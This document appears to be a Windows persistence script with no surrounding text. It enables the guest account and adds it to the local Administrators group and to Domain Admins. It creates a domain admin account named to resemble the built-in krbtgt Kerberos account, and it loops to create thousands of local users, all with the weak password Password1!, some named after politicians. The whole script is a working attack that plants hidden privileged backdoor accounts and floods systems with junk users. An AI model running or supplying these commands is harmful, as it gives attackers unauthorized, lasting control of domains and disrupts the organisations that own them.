net user guest /active:yes
net localgroup "Administrators" guest /add /y

net user /add krbtg Password1! /domain
net group "Domain Admins" krbtg /ADD /DOMAIN

net group "Domain Admins" guest /ADD

#For newer PowerShell
for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "bob$i" -Password "Password1!" 
  net group "Domain Admins" krbtg /ADD /DOMAIN
}

for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "Donald Trump$i" -Password "Password1!" 
}

for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "Ron Desantis$i" -Password "Password1!" 
}

for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "Hacker$i" -Password "Password1!" 
}

for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "Kaiser Wilhem$i" -Password "Password1!" 
}

for ($i = 0; $i -lt 1000; $i++) {
  New-LocalUser -Name "moleary$i" -Password "Password1!" 
}

# For Older Powershell
for ($i = 0; $i -lt 1000; $i++) {
  net user  "bob$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Donald Trump$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Hacker$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Ron Desantis$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "moleary$i" Password1! /ADD 
}
